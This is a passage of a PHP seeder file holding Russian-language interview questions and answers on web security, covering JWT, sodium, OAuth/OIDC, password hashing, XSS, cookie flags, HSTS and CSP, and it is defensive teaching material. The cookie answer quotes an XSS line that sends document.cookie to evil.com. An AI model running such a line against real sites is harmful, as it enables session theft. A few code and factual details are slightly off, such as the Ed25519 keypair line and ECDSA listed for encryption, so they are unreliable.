- инвалидирует ВСЕ токены сразу, не точечно. Практически: для большинства приложений использовать sessions (stateful, легко отозвать), а JWT - только когда реально нужен stateless (межсервисная аутентификация, мобильные клиенты, OAuth). Если выбрали JWT - короткий TTL + refresh + denylist на jti.',
                'code_example' => '<?php
// Подход 1: короткий TTL + refresh
class TokenIssuer
{
    public function issue(User $user): array
    {
        return [
            "access" => JWT::encode([
                "sub" => $user->id,
                "exp" => time() + 900,           // 15 минут
                "jti" => Str::ulid(),
            ], $this->secret),
            "refresh" => DB::table("refresh_tokens")->insertGetId([
                "user_id" => $user->id,
                "token_hash" => hash("sha256", $rawRefresh = bin2hex(random_bytes(32))),
                "expires_at" => now()->addDays(30),
            ]) ? $rawRefresh : null,
        ];
    }

    public function logout(string $rawRefresh): void
    {
        DB::table("refresh_tokens")
            ->where("token_hash", hash("sha256", $rawRefresh))
            ->delete(); // отзыв через удаление
    }
}

// Подход 2: denylist на jti для немедленного logout
public function logoutNow(string $jwt): void
{
    $payload = JWT::decode($jwt, $this->secret);
    $ttl = $payload->exp - time();
    Redis::setex("revoked:jti:{$payload->jti}", $ttl, 1);
}

public function isRevoked(string $jti): bool
{
    return Redis::exists("revoked:jti:{$jti}") > 0;
}

// Подход 3: token_version
public function validate(string $jwt): User
{
    $payload = JWT::decode($jwt, $this->secret);
    $user = User::find($payload->sub);
    if ($user->token_version !== $payload->ver) {
        throw new TokenRevokedException;
    }
    return $user;
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Почему для шифрования в PHP сейчас рекомендуют sodium_*, а не openssl_*?',
                'answer' => 'libsodium (расширение sodium, входит в стандарт PHP 7.2+) - современная криптографическая библиотека, портабильная реализация NaCl (NaCl от Daniel J. Bernstein, libsodium ведёт Frank Denis), спроектированная по принципу "secure by default". OpenSSL - универсальный инструмент с тысячами опций, многие из которых небезопасны или устарели. Главные различия. 1) Защита от ошибок API. В sodium практически нечего настраивать: sodium_crypto_secretbox($plaintext, $nonce, $key) - один правильный набор примитивов (XSalsa20-Poly1305 или ChaCha20-Poly1305), authenticated encryption из коробки, защита от подмены шифротекста. В OpenSSL вы выбираете cipher (AES-128/256), mode (CBC/CTR/GCM), padding, IV длину - и шанс выбрать небезопасное (CBC без HMAC = padding oracle attack) огромен. 2) Современная криптография. ChaCha20-Poly1305 быстрее AES на устройствах без AES-NI (мобилки, embedded), Curve25519/Ed25519 для подписей, BLAKE2 для хешей, Argon2id для KDF. 3) Защита от side-channel. Все sodium-функции выполняются за константное время - устойчивы к timing-атакам. В OpenSSL это надо думать самому (и ошибаться). 4) Меньшая поверхность атаки: ~50 функций sodium vs тысячи openssl. 5) Forward secrecy и nonce-misuse resistant конструкции. Когда что: новый код - sodium всегда, кроме специфичных случаев (нужны конкретные cipher для совместимости со сторонним сервером, X.509-сертификаты, S/MIME). OpenSSL остаётся для совместимости, парсинга сертификатов, специфичных алгоритмов. Laravel\'s Crypt фасад (Illuminate\\Encryption\\Encrypter) по умолчанию использует AES-256-CBC + HMAC-SHA256 в режиме Encrypt-then-MAC: сначала openssl_encrypt над сериализованным значением, затем hash_hmac("sha256", $iv.$ciphertext, $key) - это безопасный канонический подход (защищает от padding-oracle), а не уязвимое MAC-then-Encrypt, погубившее SSL/TLS. С Laravel 9+ доступна альтернатива AES-256-GCM через cipher: AES-256-GCM в config/app.php; для AEAD-шифров HMAC не нужен - tag/MAC даёт сам openssl_encrypt. Для нового кода всё равно sodium предпочтительнее (меньше ручных параметров, встроенный AEAD), но Crypt-фасад реализован грамотно. libsodium — портабильная реализация NaCl (NaCl от Daniel J. Bernstein); ведёт Frank Denis.',
                'code_example' => '<?php
// ✅ sodium - secure by default
$key = sodium_crypto_secretbox_keygen(); // 32 байта, безопасный random
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); // 24 байта
$ciphertext = sodium_crypto_secretbox("секретное сообщение", $nonce, $key);

// расшифровка с проверкой целостности (вернёт false при подмене)
$plaintext = sodium_crypto_secretbox_open($ciphertext, $nonce, $key);
if ($plaintext === false) throw new RuntimeException("tampered");

// Хеширование паролей (Argon2id - state-of-the-art)
$hash = sodium_crypto_pwhash_str(
    $password,
    SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE,
    SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE,
);
sodium_crypto_pwhash_str_verify($hash, $password); // bool

// Подписи (Ed25519)
[$sk, $pk] = [sodium_crypto_sign_keypair(), /* ... */];
$signed = sodium_crypto_sign_detached($message, $sk);
sodium_crypto_sign_verify_detached($signed, $message, $pk);

// ⚠️ openssl - те же задачи, но легко ошибиться
// AES-256-GCM (правильный выбор) - но многие пишут AES-256-CBC + забывают HMAC
$iv = random_bytes(openssl_cipher_iv_length("aes-256-gcm"));
$tag = "";
$ciphertext = openssl_encrypt(
    "сообщение", "aes-256-gcm", $key, OPENSSL_RAW_DATA, $iv, $tag, "", 16
);
// для расшифровки нужно сохранить и iv, и tag - забыл tag - нет проверки целостности

// Затирание чувствительных данных в памяти
sodium_memzero($password); // у openssl такого нет',
                'code_language' => 'php',
                'difficulty' => 5,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём разница между OAuth 2.0 и OpenID Connect (OIDC)?',
                'answer' => 'Это РАЗНЫЕ вещи, которые часто путают, и на собеседованиях ловят на подмене понятий. OAuth 2.0 - протокол АВТОРИЗАЦИИ (authorization). Решает задачу "пользователь разрешил приложению X доступ к API сервиса Y от своего имени". На выходе - access_token, который вы предъявляете API. OAuth НЕ говорит, кто этот пользователь и не предназначен для аутентификации - это только делегирование прав. Есть несколько flow: Authorization Code (с PKCE для SPA/mobile - стандарт сегодня), Client Credentials (machine-to-machine, нет юзера), Device Code (TV/IoT), Refresh Token. Implicit и Resource Owner Password Credentials - устаревшие, не использовать. OpenID Connect (OIDC) - надстройка над OAuth 2.0 для АУТЕНТИФИКАЦИИ. Решает "кто этот пользователь и как мне получить его профиль". Добавляет к OAuth flow id_token (всегда JWT, не как access_token, который может быть opaque) с claims: sub (user id), email, name, picture, email_verified, и подписан издателем (issuer). Endpoints: /.well-known/openid-configuration (discovery - как найти все остальные ручки), /authorize, /token, /userinfo (получить профиль по access_token), /jwks (открытый ключ для проверки подписи id_token). Когда что использовать: 1) Хотите дать "Войти через Google/GitHub" - OIDC, нужен id_token чтобы понять кто залогинился. 2) Делаете API gateway, который пропускает access_token к downstream сервисам - OAuth 2.0. 3) Машина-машина (cron вызывает API) - OAuth 2.0 Client Credentials. Практическое следствие путаницы: использовать access_token для аутентификации (читать "sub" и считать юзера залогиненным) - анти-паттерн, токен может быть opaque, или предназначен для другой audience, или вообще не содержать user info. Для аутентификации - id_token из OIDC. В Laravel: Socialite поддерживает оба - провайдеры Google/GitHub/etc используют OIDC под капотом, но в коде вы видите $user->getEmail() / getName() от Socialite-обёртки.',
                'code_example' => '<?php
// OIDC flow с Laravel Socialite (Google login)
// routes/web.php
Route::get("/login/google", fn () => Socialite::driver("google")->redirect());
Route::get("/login/google/callback", function () {
    $googleUser = Socialite::driver("google")->user();
    // под капотом: получили code → обменяли на access_token + id_token
    // Socialite верифицировал id_token и распарсил claims

    $user = User::updateOrCreate(
        ["email" => $googleUser->getEmail()],
        ["name" => $googleUser->getName(), "google_id" => $googleUser->getId()]
    );

    Auth::login($user); // классическая cookie-сессия Laravel - аутентификация юзера
});

// OAuth 2.0 (без OIDC) - доступ к чужому API от имени юзера
$response = Http::withToken($accessToken)
    ->get("https://api.dropbox.com/2/files/list_folder", ["path" => "/"]);

// Client Credentials - сервис-сервис
$token = Http::asForm()->post("https://auth.example.com/oauth/token", [
    "grant_type" => "client_credentials",
    "client_id" => env("CLIENT_ID"),
    "client_secret" => env("CLIENT_SECRET"),
    "scope" => "orders.read",
])->json("access_token");

// ID Token (JWT с user claims) - выдаётся OIDC, НЕ OAuth
// {
//   "iss": "https://accounts.google.com",
//   "sub": "1234567890",
//   "aud": "your-client-id.apps.googleusercontent.com",
//   "email": "user@example.com",
//   "email_verified": true,
//   "name": "John Doe",
//   "iat": 1717000000,
//   "exp": 1717003600
// }
// Подпись проверяется по JWKS issuer-а: GET https://accounts.google.com/.well-known/openid-configuration

// ❌ Анти-паттерн: использовать access_token как identity
// access_token может быть opaque, иметь aud другого ресурса, не содержать user info',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём принципиальная разница между хешированием и шифрованием?',
                'answer' => 'Главное отличие — **обратимость**.

**Хеширование** — **односторонняя** функция:

- из входа получается строка **фиксированной длины** (`SHA-256` → 256 бит всегда)
- **обратно восстановить нельзя** математически, только **подбирать** (brute force)
- одинаковый вход → **одинаковый хеш** (детерминированно)
- алгоритмы: `bcrypt`, `argon2id` (для паролей); `SHA-256`, `BLAKE3` (для целостности)

**Шифрование** — **двусторонняя** операция с **ключом**:

- `plaintext` + `key` → `ciphertext`
- `ciphertext` + `key` → обратно `plaintext`
- симметричное (`AES-256-GCM`) — один ключ для шифрования и расшифровки
- асимметричное (`RSA`, `ECDSA`) — пара ключей: публичный для шифрования, приватный для расшифровки

**Что когда использовать:**

| Задача | Что брать |
|---|---|
| **Пароли** | хеширование (`password_hash` → `argon2id`/`bcrypt`) |
| **Номер карты, ПДн** | шифрование (`Crypt::encryptString` в Laravel) |
| **Целостность файла** | хеш (`SHA-256` чек-сумма) |
| **Передача данных по сети** | шифрование (`TLS`) |

**Правило:** если данные нужно **вернуть обратно** — шифруй. Если только **сравнивать** — хешируй.',
                'code_example' => '<?php
// Хеширование пароля (нельзя расшифровать обратно)
$hash = Hash::make("secret123");          // argon2id/bcrypt
Hash::check("secret123", $hash);          // true/false

// Шифрование (можно расшифровать)
$encrypted = Crypt::encryptString("PAN: 4111-1111-1111-1111");
$plain = Crypt::decryptString($encrypted); // обратно',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Зачем при хешировании паролей нужна соль и почему она должна быть уникальной?',
                'answer' => '**Соль** (salt) — **случайные байты**, которые **подмешиваются к паролю** перед хешированием. Из-за этого **одинаковые пароли разных пользователей** дают **разные хеши**.

**Без соли:**

- два пользователя с паролем `qwerty123` имеют **одинаковый хеш** в БД — видно сразу
- атакующий с дампом базы **заранее считает rainbow-таблицу** (`hash → пароль`) один раз и **мгновенно** сопоставляет миллионы хешей популярным паролям
- утечка БД = утечка паролей за минуты

**С уникальной солью у каждого пользователя:**

- хеши одинаковых паролей **разные**
- rainbow-таблицы **бесполезны** — атакующему приходится **брутить каждый пароль отдельно**, тратя время на каждого
- с `bcrypt`/`argon2id` это **миллионы лет** на миллион пользователей

**Где хранится соль:** прямо **внутри строки хеша**. У `bcrypt` формат `$2y$cost$saltHASH`. У `argon2id` — `$argon2id$v=19$m=...,t=...,p=...$salt$hash`. Поэтому **отдельной колонки под соль заводить не надо** — `password_hash()` всё упакует и `password_verify()` сам её достанет.

**В Laravel:** `Hash::make($password)` — соль генерируется автоматически. **Никогда не указывай свою соль вручную** — функция справится лучше.',
                'code_example' => '<?php
// Соль внутри хеша, для каждого пользователя своя
$hash1 = password_hash("qwerty123", PASSWORD_ARGON2ID);
$hash2 = password_hash("qwerty123", PASSWORD_ARGON2ID);
// $hash1 !== $hash2 — соли разные

// Проверка — соль вытащится из строки автоматически
password_verify("qwerty123", $hash1); // true

// Laravel-обёртка
$hash = Hash::make("qwerty123");
Hash::check("qwerty123", $hash); // true',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем pepper отличается от соли и зачем его иногда добавляют поверх password_hash()?',
                'answer' => 'Соль уникальна на каждого пользователя и хранится рядом с хешем, а pepper — это один общий секрет, который держится не в БД, а в конфиге приложения или KMS. Идея в том, что при утечке только базы (без файлов приложения) хеши становятся бесполезны, потому что атакующий не знает pepper. Реализуется через hash_hmac($password, $pepper) перед password_hash(), либо через sodium_crypto_pwhash_str с дополнительным ключом. Минус — ротация pepper требует пересчёта хешей, поэтому в большинстве проектов хватает обычного password_hash().',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем argon2id отличается от bcrypt и почему его сейчас обычно предпочитают?',
                'answer' => 'Оба — **медленные password-hash функции**. Главное отличие — **memory-hardness**.

| | **`bcrypt`** (1999) | **`argon2id`** (2015) |
|---|---|---|
| **Тюнинг** | один параметр — `cost` (CPU-раунды) | три — `memory`, `time`, `parallelism` |
| **Memory-hard** | нет (~4 KB) | **да** (десятки–сотни МБ) |
| **Защита от GPU/ASIC** | средняя | **высокая** — память дорогая на ASIC |
| **Лимит пароля** | **72 байта** (молча обрезает) | без лимита |
| **Стандарт** | де-факто | **победитель Password Hashing Competition** |
| **PHP-константа** | `PASSWORD_BCRYPT` | `PASSWORD_ARGON2ID` |

**Что значит memory-hard:** `argon2id` форсирует **много памяти** на вычисление хеша. Атакующий с GPU на 24 ГБ может крутить тысячи `bcrypt` параллельно, но **сотни `argon2id`** — упирается в RAM. На ASIC ещё дороже — там память самое узкое место.

**Параметры `argon2id` по умолчанию в PHP:**

- `memory_cost = 65536` (64 МБ)
- `time_cost = 4` (4 итерации)
- `threads = 1`

Подбирать так, чтобы **проверка занимала ~250–500 мс** на твоём железе — баланс UX и стойкости.

**Когда выбирать что:**

- **новый проект** → `argon2id`
- **старый проект на `bcrypt`** → нормально, **постепенная миграция** через `password_needs_rehash()` при логине
- **`bcrypt` остаётся**, если хостинг без `libsodium`/`argon2` (`PHP < 7.2` без extension)',
                'code_example' => '<?php
// Argon2id с явными параметрами
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    "memory_cost" => 65536,   // 64 МБ
    "time_cost"   => 4,
    "threads"     => 1,
]);

// Прозрачная миграция bcrypt → argon2id при логине
if (password_verify($password, $user->password)) {
    if (password_needs_rehash($user->password, PASSWORD_ARGON2ID)) {
        $user->update(["password" => password_hash($password, PASSWORD_ARGON2ID)]);
    }
    Auth::login($user);
}

// Laravel: config/hashing.php
// "driver" => "argon2id",
// "argon" => ["memory" => 65536, "threads" => 1, "time" => 4],',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем отличаются stored, reflected и DOM-based XSS?',
                'answer' => 'Три типа `XSS` различаются **тем, где живёт payload** и **как доходит до жертвы**.

| | **Stored** | **Reflected** | **DOM-based** |
|---|---|---|---|
| **Где payload** | в БД на сервере | в URL/параметре одного запроса | в клиентском JS, не уходит на сервер |
| **Доставка жертве** | автоматически всем посетителям страницы | через подготовленную ссылку (фишинг) | через ссылку, но обработка на клиенте |
| **Опасность** | **максимальная** (массовая) | средняя (нужен клик) | средняя |
| **Где чинить** | экранирование вывода на сервере | экранирование вывода на сервере | работа с DOM в клиентском JS |

**Stored XSS** — атакующий **сохраняет** скрипт (комментарий, имя профиля, описание товара). Сервер потом отдаёт его всем — payload запускается **у каждого посетителя страницы**. Самый опасный: одна вставка → тысячи жертв.

**Reflected XSS** — payload **в параметре одного запроса**: `https://site.com/search?q=<script>...</script>`. Сервер вернул его в HTML без экранирования. Жертва должна **кликнуть** по подготовленной ссылке. Часто доставляется через фишинг.

**DOM-based XSS** — **полностью в клиенте**. Уязвимый JS читает данные из источника (`location.hash`, `document.referrer`, `window.name`) и пишет в опасный sink (`innerHTML`, `eval`, `document.write`). **Сервер вообще не видит payload** — WAF и серверная защита бесполезны.

**Защита:**

- **Stored/Reflected** — экранирование вывода на сервере (`htmlspecialchars`, Blade `{{ }}`)
- **DOM-based** — **только клиентская защита**: использовать `textContent` вместо `innerHTML`, `setAttribute()` вместо склейки HTML, `DOMPurify` для разрешённого HTML
- **CSP** — помогает против всех трёх, особенно `script-src \'self\' \'nonce-...\'`',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие флаги cookie и зачем нужны для защиты сессии?',
                'answer' => 'Флаги cookie — **дешёвый и эффективный** способ закрыть классические атаки на сессию.

- **`Secure`** — браузер шлёт cookie **только по HTTPS**. Без флага сессия утечёт через открытый Wi-Fi (`sslstrip`, `evil twin`).
- **`HttpOnly`** — cookie **не видна из JS** (`document.cookie`). XSS-payload не сможет утащить `session_id` через `fetch("//evil.com?c=" + document.cookie)`. **Главная защита от кражи сессии через XSS**.
- **`SameSite=Strict`** — cookie **никогда** не уходит на cross-site запросы. Полностью закрывает CSRF, но ломает UX: переход с внешней ссылки на сайт = разлогин.
- **`SameSite=Lax`** (дефолт в современных браузерах) — cookie уходит только на **top-level navigation** (`GET`-переходы), не на скрытые `POST`/iframe-запросы с другого сайта. **Закрывает 95% CSRF**.
- **`SameSite=None`** — отключает защиту, **обязательно с `Secure`**. Нужно для cross-origin сценариев (внешний iframe-виджет).
- **`Domain` и `Path`** — сужают область действия. Без `Domain` cookie действует **только на текущем хосте** (host-only). С `Domain=.example.com` — на всех поддоменах.
- **`Max-Age`/`Expires`** — срок жизни. Без них cookie — session-only (умирает с браузером).

**Префиксы — дополнительная защита:**

- **`__Host-`** — браузер **обязует** `Secure` + **без `Domain`** + `Path=/`. Поддомен **не сможет переписать** родительскую cookie.
- **`__Secure-`** — обязательный `Secure`, без других ограничений.

**Боевой минимум для session cookie:** `HttpOnly; Secure; SameSite=Lax; Path=/; __Host- префикс`.',
                'code_example' => '<?php
// Laravel — config/session.php
return [
    "lifetime" => 120,                     // минут
    "secure" => env("SESSION_SECURE_COOKIE", true),  // только HTTPS
    "http_only" => true,                   // не видна JS
    "same_site" => "lax",                  // защита от CSRF
    "domain" => null,                      // host-only — безопаснее
];

// Что отправит сервер
// Set-Cookie: laravel_session=abc123;
//             Path=/;
//             HttpOnly;
//             Secure;
//             SameSite=Lax

// Вручную (Symfony Cookie)
cookie("auth", $token, 60, "/", null, secure: true, httpOnly: true, sameSite: "Lax");',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое HSTS и какую проблему он решает поверх обычного https?',
                'answer' => 'HSTS (HTTP Strict-Transport-Security) — это заголовок ответа, в котором сервер говорит браузеру: «следующие N секунд ходи ко мне только по https и не доверяй сертификатам с ошибками». Без него атакующий в man-in-the-middle может перехватить первый http-запрос и не дать редиректу на https случиться (sslstrip). HSTS закрывает эту дыру для повторных визитов, а флаг preload и список в браузерах решают её даже для самого первого визита. На практике задают max-age порядка года, includeSubDomains и preload только когда уверены, что весь домен поднят на https.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое open redirect и почему его нельзя считать безобидной багой?',
                'answer' => 'Open redirect — это эндпоинт, который принимает целевой URL в параметре и редиректит на него без проверки домена, например /login?next=https://evil.com. Сам по себе он не отдаёт чужие данные, но даёт атакующему доверенную ссылку с вашего домена, ведущую на фишинг или на страницу под видом OAuth. Особенно болезненно, когда параметр redirect_uri используется в OAuth-флоу — там open redirect ломает всю модель доверия и позволяет угнать access token. Защита — белый список разрешённых хостов или разрешать только относительные пути.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое Subresource Integrity и когда её стоит включать?',
                'answer' => 'SRI — это атрибут integrity у тега script или link, в котором указывается sha-хеш ожидаемого содержимого файла. Браузер скачивает ресурс и отказывается его выполнять, если хеш не совпал. Это защищает от подмены файлов на чужом CDN или у скомпрометированного хостера статики: даже если злоумышленник переписал jquery.min.js, ваш сайт его просто не подключит. Включать имеет смысл для всех сторонних скриптов и стилей с фиксированной версией; для собственной статики, которую вы катите регулярно, SRI обычно не нужен.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Зачем нужна многофакторная аутентификация, если пароль уже надёжный?',
                'answer' => 'Любой пароль **может утечь**, и пользователь не узнает об этом:

- **фишинг** — ввёл на поддельной странице
- **password reuse** — слили базу соседнего сайта, тот же пароль работает у тебя
- **кейлоггер** на скомпрометированном устройстве
- **brute force / credential stuffing** — атакующий пробует пары `email/password` из утечек
- **внутренние** утечки (insider threat, упавший backup)

**MFA добавляет второй фактор из другой категории** — украсть оба одновременно гораздо сложнее.

**Три категории факторов:**

1. **Знание** (something you know) — пароль, PIN, ответ на секретный вопрос
2. **Владение** (something you have) — TOTP-приложение, аппаратный ключ, SMS на телефон, push в banking app
3. **Биометрия** (something you are) — отпечаток, Face ID, голос

Настоящий **MFA** — это **два фактора из разных категорий**. Два пароля — это не MFA.

**Сравнение реализаций:**

| Метод | RFC/стандарт | Защита от фишинга | Минусы |
|---|---|---|---|
| **`TOTP`** (Google Authenticator) | RFC 6238 | средняя — код можно ввести на поддельной странице | seed надо беречь |
| **SMS** | — | низкая — **SIM-swap**, перехват SS7 | NIST не рекомендует, но лучше чем ничего |
| **Push** (banking app) | — | средняя — пользователь может одобрить случайно | требует доверенного устройства |
| **`WebAuthn`/FIDO2** (YubiKey, Passkeys) | W3C/CTAP2 | **высокая — привязка к домену** | железо или поддержка ОС |

**Главное преимущество `WebAuthn`:** ключ подписывает запрос **с указанием домена**. Фишинговая страница `bank-evil.com` не получит валидную подпись для `bank.com`. **Невозможно зафишить**.

**Где обязателен MFA:** админ-панели, доступ к продакшену, банки, корп-аккаунты. Для обычного юзера — `TOTP`/passkey по умолчанию + recovery codes.',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Как работает CORS preflight и когда он отправляется?',
                'answer' => 'Браузер шлёт preflight (OPTIONS с Access-Control-Request-Method и -Headers) перед «непростыми» кросс-доменными запросами: PUT/DELETE/PATCH, кастомные заголовки (Authorization, X-CSRF), Content-Type вне application/x-www-form-urlencoded/multipart/form-data/text/plain. Сервер отвечает заголовками Access-Control-Allow-Origin/Methods/Headers и опционально Access-Control-Max-Age, чтобы браузер закэшировал ответ и не переспрашивал. Простые GET/POST с form-encoded телом летят без preflight. Типовая ошибка — отдавать * в Allow-Origin вместе с Allow-Credentials: true, браузер такой ответ откатит. Ещё одна — забыть OPTIONS в роутах фреймворка и получать 405 на preflight.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие grant types в OAuth 2.0 актуальны и как выбрать нужный?',
                'answer' => 'Authorization Code + PKCE — рекомендованный flow для серверных и SPA/мобильных приложений: пользователь логинится у провайдера, приложение получает код и меняет его на токен через свой бэкенд или с PKCE. Client Credentials — для server-to-server, где нет пользователя, а есть только сервис с client_id/secret. Refresh Token — обмен старого refresh на новую пару access+refresh, применяется в долгих сессиях. Resource Owner Password Credentials и Implicit считаются устаревшими и больше не рекомендуются OAuth 2.1: первый отдаёт пароль приложению, второй прокидывает токен через URL-фрагмент и течёт в логи. Device Authorization Grant — для устройств без удобного ввода (TV, CLI).',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое Content Security Policy (CSP)?',
                'answer' => 'CSP - HTTP-заголовок, говорящий браузеру откуда можно загружать ресурсы (JS, CSS, картинки, fetch). Защита от XSS: даже если злоумышленник вставил скрипт, браузер откажется его выполнять, если источник не разрешён. Например: "JS только из своего домена и cdn.jsdelivr.net". Очень эффективно, но требует настройки и тестирования - можно сломать сайт.',
                'code_example' => 'Content-Security-Policy:
  default-src \'self\';
  script-src \'self\' https://cdn.jsdelivr.net;
  style-src \'self\' \'unsafe-inline\';
  img-src \'self\' data: https:;
  connect-src \'self\' https://api.example.com;',
                'code_language' => 'bash',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
        ];
    }
}
